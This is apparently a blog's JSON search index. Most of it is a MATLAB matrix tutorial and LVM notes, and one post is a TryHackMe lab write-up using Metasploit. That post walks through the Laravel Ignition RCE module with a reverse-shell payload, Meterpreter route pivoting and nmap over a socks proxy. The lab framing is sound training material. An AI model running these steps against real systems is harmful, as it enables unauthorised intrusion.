Frobenius范数，表示为||A||F，定义为矩阵A各元素的平方和的平方根，计算公式为： $$\\left\\lVert A\\right\\rVert_F = \\sqrt{\\sum_{i=1}^m \\sum_{j=1}^n |a_{i,j}|^2}$$ 1范数，表示为||A||1，定义为矩阵A各列元素绝对值之和的最大值，计算公式为： $$\\left\\lVert A \\right\\rVert_1 = \\max_{1 \\leq j \\leq n} \\sum_{i=1}^{m} |a_{i,j}|$$ 2范数，表示为||A||2，定义为矩阵A的最大奇异值，计算公式为： $$\\left\\lVert A \\right\\rVert_2 = \\sqrt{\\lambda_{\\max}(A^*A)}$$ 无穷范数，表示为||A||inf，定义为矩阵A各行元素绝对值之和的最大值，计算公式为： $$\\left\\lVert A \\right\\rVert_{\\infty} = \\max_{1 \\leq i \\leq m} \\sum_{j=1}^{n} |a_{i,j}|$$ 核范数，表示为||A||*，定义为矩阵A的奇异值之和，计算公式为： $$\\left\\lVert A \\right\\rVert_* = \\sum_{i=1}^{\\min(m,n)} \\sigma_i$$ 矩阵求逆使用inv函数来计算矩阵的逆，该函数的语法如下： 1inv(A) 其中，A为待求逆矩阵，返回值为A的逆矩阵。需要注意的是，只有可逆矩阵才能求逆，如果A为奇异矩阵，则inv(A)会返回一个警告信息。 下面是一个简单的示例，计算一个3x3的矩阵的逆： $$\\left[\\begin{matrix}1 &amp; 2 &amp; 3 \\\\4 &amp; 5 &amp; 6 \\\\7 &amp; 8 &amp; 9 \\\\\\end{matrix}\\right]$$ 123456789% 定义一个3x3的矩阵AA = [1, 2, 3; 4, 5, 6; 7, 8, 9];% 求A的逆矩阵A_inv = inv(A);% 输出结果disp(&quot;A的逆矩阵为：&quot;);disp(A_inv); 行列式值使用det函数来计算矩阵的行列式值，该函数的语法如下： 1det(A) 其中，A为待计算行列式值的矩阵，返回值为A的行列式值。 下面是一个简单的示例，计算一个3x3的矩阵的行列式值： 12345678% 定义一个3x3的矩阵AA = [1, 2, 3; 4, 5, 6; 7, 8, 9];% 计算A的行列式值det_A = det(A);% 输出结果disp(&quot;A的行列式值为：&quot; + det_A); 需要注意的是，当矩阵的行列式值为0时，表示该矩阵不可逆。 伪逆矩阵(广义逆矩阵)除了使用pinv函数来求矩阵的逆矩阵外，还可以使用pinv函数来求矩阵的广义逆矩阵。与逆矩阵不同的是，广义逆矩阵可以应用于任意矩阵，包括非方阵和奇异矩阵。 pinv函数的语法如下： 1pinv(A) 其中，A为待求广义逆矩阵的矩阵，返回值为A的广义逆矩阵。 下面是一个简单的示例，求一个3x4的矩阵的广义逆矩阵： $$\\left[\\begin{matrix}1 &amp; 2 &amp; 3 &amp; 4 \\\\5 &amp; 6 &amp; 7 &amp; 8 \\\\9 &amp; 10 &amp; 11 &amp; 12 \\\\\\end{matrix}\\right]$$ 123456789% 定义一个3x4的矩阵AA = [1, 2, 3, 4; 5, 6, 7, 8; 9, 10, 11, 12];% 求A的广义逆矩阵A_pinv = pinv(A);% 输出结果disp(&quot;A的广义逆矩阵为：&quot;);disp(A_pinv); 需要注意的是，对于方阵来说，广义逆矩阵等价于逆矩阵。 这玩意到底是个啥，我也不知道，我数学差，看维基吧🥹 线性方程组求解在MATLAB中，可以使用\\运算符或inv函数来求解线性方程组。\\运算符使用的是LU分解法，而inv函数使用的是高斯-约旦消元法。 使用\\运算符 \\运算符的语法如下： $A\\mathbf{x}=\\mathbf{b}$ 1x = A \\ b 其中，A为系数矩阵，b为常数向量，x为待求解的未知向量。这个运算符的作用是求解线性方程组Ax=b，返回值为x。需要注意的是，如果矩阵A是奇异矩阵或非方阵，则\\运算符会返回一个警告信息。 下面是一个简单的示例，使用””运算符求解一个3x3的线性方程组： 12345678910% 定义系数矩阵A和常数向量bA = [1, 2, 3; 4, 5, 6; 7, 8, 10];b = [3; 6; 9];% 求解线性方程组Ax=bx = A \\ b;% 输出结果disp(&quot;未知向量x为：&quot;);disp(x); 使用inv函数 inv函数的语法如下： 1x = inv(A) * b 其中，A为系数矩阵，b为常数向量，x为待求解的未知向量。这个函数的作用是求解线性方程组Ax=b，返回值为x。需要注意的是，如果矩阵A是奇异矩阵，则inv函数会返回一个警告信息。 下面是一个简单的示例，使用inv函数求解一个3x3的线性方程组： $$\\begin{equation}\\left[\\begin{array}{ccc}1 &amp; 2 &amp; 3 \\\\4 &amp; 5 &amp; 6 \\\\7 &amp; 8 &amp; 10 \\\\\\end{array}\\right]\\left[\\begin{array}{c}x_1 \\\\x_2 \\\\x_3 \\ \\end{array} \\right]=\\left[\\begin{array}{c}3 \\\\6 \\\\9 \\\\\\end{array}\\right]\\end{equation}$$ 12345678910% 定义系数矩阵A和常数向量bA = [1, 2, 3; 4, 5, 6; 7, 8, 10];b = [3; 6; 9];% 求解线性方程组Ax=bx = inv(A) * b;% 输出结果disp(&quot;未知向量x为：&quot;);disp(x); 需要注意的是，使用\\运算符比inv函数更快，因为\\运算符使用的是LU分解法，而inv函数使用的是高斯-约旦消元法。 超定方程组Matlab 中求解超定方程组可以使用\\运算符 假设有一个超定方程组 $A\\mathbf{x} = \\mathbf{b}$，其中 $A$ 是一个 $m \\times n$ 的系数矩阵 $(m &gt; n)$，$\\mathbf{x}$ 是一个 $n \\times 1$ 的未知向量，$\\mathbf{b}$ 是一个 $m \\times 1$ 的常数向量。 可以使用以下代码求解 $\\mathbf{x}$： 1x = A \\ b; 其中，反斜线左侧的矩阵是系数矩阵 $A$，反斜线右侧的向量是常数向量 $\\mathbf{b}$。在运算过程中,MATLAB会自动计算矩阵的伪逆来求解超定方程组。如果矩阵 $A$ 的行满秩，那么 $\\mathbf{x}$ 的解将是唯一的。如果矩阵 $A$ 的行不满秩，那么可能有多个解，此时MATLAB会返回其中一个解。 需要注意的是，在使用反斜线运算符求解超定方程组之前，确保矩阵 $A$ 的行满秩是很重要的。如果矩阵 $A$ 的行不满秩，那么反斜线运算符仍然可以返回一个解，但这个解可能不是唯一的。在这种情况下，需要使用其他方法来确定最优解，例如最小二乘法。 不定方程组如果所说的是形如 $A\\mathbf{x} = \\mathbf{b}$ 的线性代数方程组，其中 $A$ 是一个 $m \\times n$ 的系数矩阵，$\\mathbf{x}$ 和 $\\mathbf{b}$ 分别是 $n \\times 1$ 和 $m \\times 1$ 的向量，则如果 $A$ 的行秩小于列秩（$m &lt; n$），那么该线性代数方程组就是一个不定方程组。 $$\\begin{cases}ax+by+cz=d \\\\ex+fy+gz=h \\\\\\end{cases}$$ 在这种情况下，由于 $A$ 的秩小于 $n$，因此有很多解可以满足等式 $A\\mathbf{x} = \\mathbf{b}$。可以使用 MATLAB 中的\\运算符\\ 来求解不定方程组的一组解。具体来说，使用以下代码： 1x = A \\ b; 其中，反斜线左侧的矩阵是系数矩阵 $A$，反斜线右侧的向量是常数向量 $\\mathbf{b}$。在运算过程中，MATLAB 会自动计算矩阵的伪逆来求解不定方程组。需要注意的是，在使用反斜线运算符求解不定方程组之前，确保矩阵 $A$ 的行秩小于列秩是很重要的。如果矩阵 $A$ 的行秩等于列秩，那么不定方程组将没有解。如果矩阵 $A$ 的行秩大于列秩，那么不定方程组将有无穷多解，需要使用其他方法来表示通解。 矩阵分解在 MATLAB 中，可以使用许多内置函数进行矩阵分解。以下是一些常见的矩阵分解函数： LU 分解MATLAB 中的lu函数可以进行 LU 分解，例如： 12A = [1,2,3;4,5,6;7,8,10];[L,U] = lu(A); 这里 L 和 U 分别是下三角矩阵和上三角矩阵，满足$ A=LU$。 $$\\begin{pmatrix}1 &amp; 2 &amp; 3 \\\\4 &amp; 5 &amp; 6 \\\\7 &amp; 8 &amp; 10 \\\\\\end{pmatrix} = \\begin{pmatrix}1 &amp; 0 &amp; 0 \\\\4 &amp; 1 &amp; 0 \\\\7 &amp; 2 &amp; 1 \\\\\\end{pmatrix}\\begin{pmatrix}1 &amp; 2 &amp; 3 \\\\0 &amp; -3 &amp; -6 \\\\0 &amp; 0 &amp; 1 \\\\\\end{pmatrix} = LU$$ QR 分解MATLAB 中的 qr 函数可以进行 QR 分解，例如： 12A = [1,2,3;4,5,6;7,8,10];[Q,R] = qr(A); 这里 Q 是正交矩阵，R 是上三角矩阵，满足 $A = QR$。 $$\\begin{pmatrix}1 &amp; 2 &amp; 3 \\\\4 &amp; 5 &amp; 6 \\\\7 &amp; 8 &amp; 10 \\\\\\end{pmatrix} = \\begin{pmatrix}-0.13 &amp; -0.53 &amp; -0.84 \\\\-0.52 &amp; -0.71 &amp; 0.46 \\\\-0.82 &amp; 0.47 &amp; -0.31 \\\\\\end{pmatrix}\\begin{pmatrix}-7.62 &amp; -8.24 &amp; -10.79 \\\\0 &amp; 0.42 &amp; 0.84 \\\\0 &amp; 0 &amp; -0.08 \\\\\\end{pmatrix}= QR$$ 奇异值分解（SVD）MATLAB 中的svd函数可以进行奇异值分解，例如： 12A = [1,2,3;4,5,6;7,8,10];[U,S,V] = svd(A); 这里 U 和 V 是正交矩阵，S 是一个对角矩阵，满足 $A=USV^T$。 $$\\begin{pmatrix} 1 &amp; 2 &amp; 3 \\\\ 4 &amp; 5 &amp; 6 \\\\ 7 &amp; 8 &amp; 10 \\\\ \\end{pmatrix} =\\begin{pmatrix} -0.25 &amp; 0.83 &amp; 0.49 \\\\ -0.51 &amp; 0.20 &amp; -0.84 \\\\ -0.82 &amp; -0.52 &amp; 0.16 \\\\\\end{pmatrix}\\begin{pmatrix} 15.81 &amp; 0 &amp; 0 \\\\ 0 &amp; 0.70 &amp; 0 \\\\ 0 &amp; 0 &amp; 0.11 \\\\ \\end{pmatrix}\\begin{pmatrix} -0.46 &amp; -0.60 &amp; -0.66 \\\\ -0.63 &amp; -0.13 &amp; 0.76 \\\\ -0.63 &amp; 0.79 &amp; -0.01 \\\\\\end{pmatrix} \\\\ =US V^T$$ 特征值分解在 Matlab 中，可以使用 eig 函数进行矩阵的特征值分析。假设有一个 $n \\times n$ 的矩阵 $A$，则可以使用以下命令求解 $A$ 的特征值和特征向量： 1[V, D] = eig(A) $$A =\\begin{bmatrix} 1 &amp; 2 &amp; 3 \\\\ 2 &amp; 4 &amp; 5 \\\\ 3 &amp; 5 &amp; 6\\end{bmatrix} =\\begin{bmatrix} -0.3854 &amp; 0.8277 &amp; -0.4082 \\\\ -0.5590 &amp; 0.1673 &amp; 0.8165 \\\\ -0.7335 &amp; -0.4930 &amp; -0.4082\\end{bmatrix}\\begin{bmatrix} 0.5157 &amp; 0 &amp; 0 \\\\ 0 &amp; 0.1072 &amp; 0 \\\\ 0 &amp; 0 &amp; 10.3771 \\end{bmatrix} =VD$$ 其中，输出变量 V 是一个 $n \\times n$ 的矩阵，每一列都是 $A$ 的一个特征向量；输出变量 D 是一个对角矩阵，其对角线上的元素是 $A$ 的特征值。特别地，如果 $A$ 是实对称矩阵，则输出的特征向量矩阵 $V$ 是正交矩阵，即 $V^T V = I$，其中 $I$ 是 $n \\times n$ 的单位矩阵。 除了求解特征值和特征向量外，eig 函数还可以计算矩阵的谱半径（即特征值的模最大值）、条件数等。比如，可以使用以下命令计算矩阵的谱半径： 1rho = max(abs(eig(A))) 其中 abs 函数表示取绝对值，max函数表示求取向量或矩阵中的最大值。 幂次运算MATLAB 中可以使用 ^ 运算符对矩阵进行幂次运算。假设矩阵 $A$ 是一个 $n \\times n$ 的方阵，$k$ 是一个正整数，则 $A^k$ 表示矩阵 $A$ 自乘 $k$ 次的结果。 下面是一个简单的例子，展示如何在 MATLAB 中计算矩阵的幂次： 假设矩阵 $A$ 和正整数 $k$ 分别为： 12A = [1 2; 3 4];k = 3; 则可以使用 ^ 运算符计算 $A^k$，代码如下： 1A_k = A^k; 计算结果为： 123A_k = 37 54 81 118 $$ x A^k = \\underbrace{A \\times A \\times \\cdots \\times A}_{\\ text{$k$ 个 $A$}} = \\begin{bmatrix} a_{11} & a_{12} & \\cdots & a_{1n} \\\\ a_{21} & a_{22} & \\cdots & a_{2n} \\\\ \\vdots & \\vdots & \\ddots & \\vdots \\\\ a_{n1} & a_{n2} & \\cdots & a_{nn} \\end{bmatrix}^k = \\\\ \\underbrace{\\begin{bmatrix} a_{11} & a_{12} & \\cdots & a_{1n} \\\\ a_{21} & a_{22} & \\cdots & a_{2n} \\\\ \\vdots & \\vdots & \\ddots & \\vdots \\\\ a_{n1} & a_{n2} & \\cdots & a_{nn} \\end{bmatrix} \\times \\begin{bmatrix} a_{11} & a_{12} & \\cdots & a_{1n} \\\\ a_{21} & a_{22} & \\cdots & a_{2n} \\\\ \\vdots & \\vdots & \\ddots & \\vdots \\\\ a_{n1} & a_{n2} & \\cdots & a_{nn} \\end{bmatrix} \\times \\cdots \\times \\begin{bmatrix} a_{11} & a_{12} & \\cdots & a_{1n} \\\\ a_{21} & a_{22} & \\cdots & a_{2n} \\\\ \\vdots & \\vdots & \\ddots & \\vdots \\\\ a_{n1} & a_{n2} & \\cdots & a_{nn} \\end{bmatrix}}_{\\text{$k$ 个矩阵}}= \\\\ \\begin {bmatrix} \\sum_{i=1}^{n} a_{1i}^k & \\sum_{i=1}^{n} a_{1i}^{k-1}a_{2i} & \\cdots & \\sum_{i=1}^{n} a_{1i}^{k-1}a_{ni} \\\\ \\sum_{i=1}^{n} a_{2i}a_{1i}^{k-1} & \\sum_{i=1}^{n} a_{2i}^k & \\cdots & \\sum_{i=1}^{n} a_{2i}^{k-1}a_{ni} \\\\ \\vdots & \\vdots & \\ddots & \\vdots \\\\ \\sum_{i=1}^{n} a_{ni}a_{1i}^{k-1} & \\sum_{i=1}^{n} a_{ni}a_{2i}^{k-1} & \\cdots & \\sum_{i=1}^{n} a_{ni}^k \\end{bmatrix}. $$ 因此，$A^k$ 的计算结果为 $\\begin{bmatrix} 37 &amp; 54 \\\\ 81 &amp; 118 \\end{bmatrix}$。 矩阵结构等处理 fliplr(A): 将矩阵 $A$ 水平翻转，即翻转矩阵的每一行。例如，对于矩阵 $A = \\begin{bmatrix} 1 &amp; 2 &amp; 3 \\\\ 4 &amp; 5 &amp; 6 \\end{bmatrix}$，使用 fliplr 函数后得到矩阵 $\\begin{bmatrix} 3 &amp; 2 &amp; 1 \\\\ 6 &amp; 5 &amp; 4 \\end{bmatrix}$。 reshape(A, m, n): 将矩阵 $A$ 转换为 $m \\times n$ 的矩阵。例如，对于矩阵 $A = \\begin{bmatrix} 1 &amp; 2 &amp; 3 \\\\ 4 &amp; 5 &amp; 6 \\end{bmatrix}$，使用 reshape(A, 3, 2) 函数后得到矩阵 $\\begin{bmatrix} 1 &amp; 2 \\\\ 3 &amp; 4 \\\\ 5 &amp; 6 \\end{bmatrix}$。 rot90(A, k): 将矩阵 $A$ 逆时针旋转 $90k$ 度。例如，对于矩阵 $A = \\begin{bmatrix} 1 &amp; 2 &amp; 3 \\\\ 4 &amp; 5 &amp; 6 \\end{bmatrix}$，使用 rot90(A, 1) 函数后得到矩阵 $\\begin{bmatrix} 3 &amp; 6 \\\\ 2 &amp; 5 \\\\ 1 &amp; 4 \\end{bmatrix}$。 diag(A): 返回矩阵 $A$ 的主对角线元素，或将向量 $v$ 转换为对角矩阵。例如，对于矩阵 $A = \\begin{bmatrix} 1 &amp; 2 &amp; 3 \\\\ 4 &amp; 5 &amp; 6 \\\\ 7 &amp; 8 &amp; 9 \\end{bmatrix}$，使用 diag(A) 函数后得到向量 $\\begin{bmatrix} 1 \\\\ 5 \\\\ 9 \\end{bmatrix}$。 tril(A, k)：返回矩阵 $A$ 的下三角部分，可选参数 $k$ 控制对角线以上的元素个数。例如，对于矩阵 $A = \\begin{bmatrix} 1 &amp; 2 &amp; 3 \\\\ 4 &amp; 5 &amp; 6 \\\\ 7 &amp; 8 &amp; 9 \\end{bmatrix}$，使用 tril(A, 1) 函数后得到矩阵 $\\begin{bmatrix} 1 &amp; 2 &amp; 0 \\\\ 4 &amp; 5 &amp; 6 \\\\ 7 &amp; 8 &amp; 9 \\end{bmatrix}$。 triu(A, k): 返回矩阵 $A$ 的上三角部分，可选参数 $k$ 控制对角线以下的元素个数。例如，对于矩阵 $A = \\begin{bmatrix} 1 &amp; 2 &amp; 3 \\\\ 4 &amp; 5 &amp; 6 \\\\ 7 &amp; 8 &amp; 9 \\end{bmatrix}$，triu(A,0) 返回的结果为 $\\begin{bmatrix} 1 &amp; 2 &amp; 3 \\\\ 0 &amp; 5 &amp; 6 \\\\ 0 &amp; 0 &amp; 9 \\end{bmatrix}$，而 triu(A,1) 返回的结果为 $\\begin{bmatrix} 0 &amp; 2 &amp; 3 \\\\ 0 &amp; 0 &amp; 6 \\\\ 0 &amp; 0 &amp; 0 \\end{bmatrix}$ 对于tril &amp; triu第二个参数是0就是主对角线，大于0就在主对角线之上，小于0就在主对角线之下","link":"/2023/04/20/12-Matlab/matx-analize/"},{"title":"Linux下lvm卷扩容","text":"Linux下lvm卷扩容事情的起因是这样的，我购置了一台主机打算放在寝室作为服务器使用，作为服务器自然需要使用Linux，最终我决定使用fedora server，而系统盘则是使用了三星的pm981，很顺利，系统也部署好了，但在服务与工具链都部署完成后，我发现在安装系统的一开始没有把全部容量分配给根目录，因此根目录只有16g的可用空间，这让我感到异常不爽，因此决定在不破坏系统的情况下扩容。 在使用lsblk查看后，发现是lvm类型的文件系统，这就意味着扩容变得简单。 逻辑卷管理器（Logical Volume Manager） 利用Linux内核中的device-mapper实现存储系统的虚拟化。也就意味着可以在物理硬盘卷宗基础上虚拟出一个存储系统，这就极大得方便了硬盘资源的管理，可以不用考虑物理逻辑卷究竟是否连续，可以将物理层面上不连续的文件系统视为一个使用。 首先第一步是操作是扩展逻辑卷 1lvetend -l + 100%FREE /dev/fedora_gshome/root # 后面跟的路径是我想要扩容的卷宗 第二步是调整文件系统 很显然我第一次尝试失败了，想当然得使用了ext4系统的调整命令 因此再次通过df -T查看卷宗的类型，发现是xfs系统 那就很简单了，调整一下命令，改用xfs系统的xfs_growfs即可 最后再次运行lsblk，很顺利，系统已经占据了ssd全部内容 总结一下lvm扩容的流程· 可以使用vps命令查看卷组情况 如果有空余的空间，就可以使用vgextend把物理卷加入卷组 扩展逻辑卷，可以使用lvextend命令扩展具体的逻辑卷。指定逻辑卷的名称以及要添加的容量大小，可以使用绝对大小（如GB）或相对大小（如+10G）。 调整文件系统，这要视情况而定，不同系统类型使用不同的命令。 ext* resize2fx xfs xfs_growfs","link":"/2023/05/24/%E6%8A%80%E5%B7%A7/02-lvmResize/"},{"title":"TryHackMe | Advent of Cyber 2022 [Day 9]","text":"我与Metasploit的第一次见面说起Metasploit，我第一次看到这个工具是在初中的时候，不过那只是在瞎倒腾Kali的时候看到的，也不知道这东西是干啥用的，由于一系列学业原因，也就没有深入下去(Too young too simple)~ Metasploit是什么? Metasploit is a powerful penetration testing tool for gaining initial access to systems, performing post-exploitation, and pivoting to other applications and systems. Metasploit is free, open-source software owned by the US-based cybersecurity firm Rapid7. Metasploit能干什么？作为一个渗透工具，Metasploit提供了许多可利用的模块已经payload生成功能，总而言之大大简化了渗透测试的复杂度。 Metasploit的基础使用123456789101112131415161718192021# Get information about the remote system, such as OSsysinfo# Upload a file or directoryupload local_file.txt# Display interfacesipconfig# Resolve a set of host names on the target to IP addresses - useful for pivotingresolve remote_service1 remote_service2# Background the current sessionbackground # List all background sessionssessions -l # Upgrade Metasploit session to a Meterpreter session sessions -u INDEX Pivoting在这个task中介绍了Pivoting这个概念，这个的意思是跳板，相当于在获取了一部机器的权限后，可以以它为跳板，透过它去渗透别的机器，就像是一个中枢一样。 Start第一步自然是运行Metasplot，由于我使用的是Arch而不是Kali，那首先要安装它(Arch真香) 1yay metasplot 假如你用的就是Kali，那么直接运行就好了 1$ msfconsole 假如运行成功会是以下界面 1234567891011121314151617181920212223242526272829303132333435Metasploit Framework console... +-------------------------------------------------------+ | METASPLOIT by Rapid7 | +---------------------------+---------------------------+ | __________________ | | | ==c(______(o(______(_() | |&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;|======[*** | | )= | | EXPLOIT | | // \\ | |____________________ | | // \\ | |==[msf &gt;]============ | | // \\ | |______________________ | | // RECON \\ | (@)(@)(@)(@)(@)(@)(@)/ | | // \\ | ********************* | +---------------------------+---------------------------+ | o O o | '///'/ | | o O | )======( | | o | .' LOOT '. | | |^^^^^^^^^^^^^^|l___ | / _||__ | | | PAYLOAD |&quot;&quot;___, | / (_||_ | | |________________|__|)__| | | __||_) | | | |(@)(@)&quot;&quot;&quot;**|(@)(@)**|(@) | &quot; || &quot; | | = = = = = = = = = = = = | '--------------' | +---------------------------+---------------------------+ =[ metasploit v6.3.12-dev ]+ -- --=[ 2308 exploits - 1205 auxiliary - 412 post ]+ -- --=[ 972 payloads - 46 encoders - 11 nops ]+ -- --=[ 9 evasion ]Metasploit tip: Search can apply complex filters such assearch cve:2009 type:exploit, see all the filterswith help searchMetasploit Documentation: https://docs.metasploit.com/msf6 &gt; 首先有几个非常有用的command 12345678# To search for a module, use the ‘search’ command:msf6 &gt; search laravel# Load a module with the ‘use’ commandmsf6 &gt; use multi/php/ignition_laravel_debug_rce# view the information about the module, including the module options, description, CVE details, etcmsf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; info search能够根据给出的关键词在数据库检索已有的漏洞(真的香) use选择其中的模块进行渗透 在选择需要的模块后就可以进入设置参数的步骤 12345678910111213141516# View the available options to setshow options# Set the target host and loggingset rhost MACHINE_IPset verbose true# Set the payload listening address; this is the IP address of the host running Metasploitset lhost LISTEN_IP# show options againshow options# Run or check the modulecheckrun | exploit 在show options中可以看到需要设置的参数，下面是一个例子： 123456789101112131415161718192021222324252627282930msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; show optionsModule options (exploit/multi/php/ignition_laravel_debug_rce):Name Current Setting Required Description---- --------------- -------- -----------LOGFILE no Laravel log file absolute pathProxies no A proxy chain of format type:host:port[,type:host:port][...]RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.htmlRPORT 80 yes The target port (TCP)SSL false no Negotiate SSL/TLS for outgoing connectionsTARGETURI /_ignition/execute-solution yes Ignition execute solution pathVHOST no HTTP server virtual hostPayload options (cmd/unix/reverse_bash):Name Current Setting Required Description---- --------------- -------- -----------LHOST yes The listen address (an interface may be specified)LPORT 4444 yes The listen portExploit target:Id Name-- ----0 Unix (In-Memory)View the full module info with the info, or info -d command. 其中rhost是目标机器的IP，lhost是本机的IP，verbose是设置是否显示详细信息，check是检查设置。 如何作为pivot在先前操作后就能够获取跳板机的shell，那既然需要通过它来对其他设备进行渗透，那么它就要承担转发的功能，在Metapreter中提供了route命令来实现这个功能，首先要在跳板机上设置转发的IP和端口，然后在跳板机上设置监听的IP和端口，最后在跳板机上执行route add命令，就能够实现转发了。 以下命令意味着，当需要访问指定ip时会通过某个特定的session去转发 Examples: 1234567891011# Example usageroute [add/remove] subnet netmask [comm/sid]# Configure the routing table to send packets destined for 172.17.0.1 to the latest opened sessionroute add 172.17.0.1/32 -1 # 可能是宿主机# Configure the routing table to send packets destined for 172.28.101.51/32 subnet to the latest opened sessionroute add 172.28.101.51/32 -1 # 其他设备# Output the routing tableroute print 在完成route的配置后就可以将Metasploit作为socks代理，从而在bash中使用nmap等工具来扫描 下面是设置socks代理的一个示例 12use auxiliary/server/socks_proxyrun srvhost=127.0.0.1 srvport=9050 version=4a 在本地机器上，我使用的是proxychains这个工具来完成代理的，当然也可以直接去系统设置处理，不过我觉得还是proxychains比较方便 1proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 MACHINE_IP 接下去就是比较基本的密码猜测了(为了降低沟通的成本和记忆成本会倾向于使用同一个密码)","link":"/2023/06/04/14-REDTEAM/01Metasploit/"},{"title":"出游新疆 DAY 1","text":"凌晨3点出发，额，睡了一天，晚上9点30抵达河南兰考。摆了，懒得写，后面有好看的贴点图。","link":"/2023/07/15/17-travel/01-%E6%96%B0%E7%96%86/"},{"title":"禾木夜拍","text":"打算拍星轨的，但是发现把快门线搞丢了，手动拍了几十张，后半夜是在太冷就睡觉去了，贴个半成品图。还有些没处理","link":"/2023/07/25/17-travel/02-%E7%A6%BE%E6%9C%A8/"}],"tags":[{"name":"网盘挂载","slug":"网盘挂载","link":"/tags/%E7%BD%91%E7%9B%98%E6%8C%82%E8%BD%BD/"},{"name":"随记","slug":"随记","link":"/tags/%E9%9A%8F%E8%AE%B0/"},{"name":"数据库","slug":"数据库","link":"/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"电影","slug":"电影","link":"/tags/%E7%94%B5%E5%BD%B1/"},{"name":"Rust","slug":"Rust","link":"/tags/Rust/"},{"name":"Web","slug":"Web","link":"/tags/Web/"},{"name":"鉴权","slug":"鉴权","link":"/tags/%E9%89%B4%E6%9D%83/"},{"name":"game","slug":"game","link":"/tags/game/"},{"name":"go","slug":"go","link":"/tags/go/"},{"name":"Docker","slug":"Docker","link":"/tags/Docker/"},{"name":"Container","slug":"Container","link":"/tags/Container/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"性能调优","slug":"性能调优","link":"/tags/%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98/"},{"name":"Github","slug":"Github","link":"/tags/Github/"},{"name":"自动部署","slug":"自动部署","link":"/tags/%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/"},{"name":"博客","slug":"博客","link":"/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"MATLAB","slug":"MATLAB","link":"/tags/MATLAB/"},{"name":"RFID","slug":"RFID","link":"/tags/RFID/"},{"name":"技巧","slug":"技巧","link":"/tags/%E6%8A%80%E5%B7%A7/"},{"name":"汇编","slug":"汇编","link":"/tags/%E6%B1%87%E7%BC%96/"},{"name":"RedTeam","slug":"RedTeam","link":"/tags/RedTeam/"},{"name":"新疆","slug":"新疆","link":"/tags/%E6%96%B0%E7%96%86/"},{"name":"星空","slug":"星空","link":"/tags/%E6%98%9F%E7%A9%BA/"}],"categories":[{"name":"电影","slug":"电影","link":"/categories/%E7%94%B5%E5%BD%B1/"},{"name":"SQL","slug":"SQL","link":"/categories/SQL/"},{"name":"Life","slug":"Life","link":"/categories/Life/"},{"name":"Rust","slug":"Rust","link":"/categories/Rust/"},{"name":"鉴权","slug":"鉴权","link":"/categories/%E9%89%B4%E6%9D%83/"},{"name":"go","slug":"go","link":"/categories/go/"},{"name":"Container","slug":"Container","link":"/categories/Container/"},{"name":"Docker","slug":"Container/Docker","link":"/categories/Container/Docker/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"性能调优","slug":"Linux/性能调优","link":"/categories/Linux/%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98/"},{"name":"Github","slug":"Github","link":"/categories/Github/"},{"name":"Github Action","slug":"Github/Github-Action","link":"/categories/Github/Github-Action/"},{"name":"MATLAB","slug":"MATLAB","link":"/categories/MATLAB/"},{"name":"File","slug":"MATLAB/File","link":"/categories/MATLAB/File/"},{"name":"Function","slug":"MATLAB/Function","link":"/categories/MATLAB/Function/"},{"name":"Draw","slug":"MATLAB/Draw","link":"/categories/MATLAB/Draw/"},{"name":"RFID","slug":"RFID","link":"/categories/RFID/"},{"name":"Matrix Analysis","slug":"MATLAB/Matrix-Analysis","link":"/categories/MATLAB/Matrix-Analysis/"},{"name":"技巧","slug":"技巧","link":"/categories/%E6%8A%80%E5%B7%A7/"},{"name":"汇编","slug":"汇编","link":"/categories/%E6%B1%87%E7%BC%96/"},{"name":"寄存器","slug":"汇编/寄存器","link":"/categories/%E6%B1%87%E7%BC%96/%E5%AF%84%E5%AD%98%E5%99%A8/"},{"name":"基础知识","slug":"汇编/基础知识","link":"/categories/%E6%B1%87%E7%BC%96/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"Linux","slug":"技巧/Linux","link":"/categories/%E6%8A%80%E5%B7%A7/Linux/"},{"name":"RedTeam","slug":"RedTeam","link":"/categories/RedTeam/"},{"name":"Penetration","slug":"RedTeam/Penetration","link":"/categories/RedTeam/Penetration/"},{"name":"旅行","slug":"旅行","link":"/categories/%E6%97%85%E8%A1%8C/"},{"name":"新疆","slug":"旅行/新疆","link":"/categories/%E6%97%85%E8%A1%8C/%E6%96%B0%E7%96%86/"},{"name":"星空","slug":"旅行/新疆/星空","link":"/categories/%E6%97%85%E8%A1%8C/%E6%96%B0%E7%96%86/%E6%98%9F%E7%A9%BA/"}],"pages":[{"title":"","text":"Helo！我是Golden Sheep(Github上是Gloden？对不起！其实是我打错了，更搞笑的是域名当时也记错了所以才有了这么一个乌龙，但是毕竟舍不得买域名的钱，那就将错就错吧 Gloden—&gt;辉光&lt;感觉也挺好听的嘛&gt; )！大学牲一只🎓~ 热爱料理与手冲咖啡，还会一丢丢烘焙，不过水平低下 喜欢旅行、影视 我的豆瓣 书影音已达750部 、钢笔收藏、单晶制作（退坑辣已经）、骑行、沙盒游戏单机3A 、番剧op、古典音乐~ 除了技术帖子还会带上一些私货 like music or movies~ 🐬","link":"/about/index.html"},{"title":"","text":"加载中，稍等几秒...","link":"/links/index.html"},{"title":"tags","text":"","link":"/tags/index.html"},{"title":"文章分类","text":"","link":"/categories/index.html"},{"title":"","text":"加载中，稍等几秒...","link":"/M2B/index.html"}]}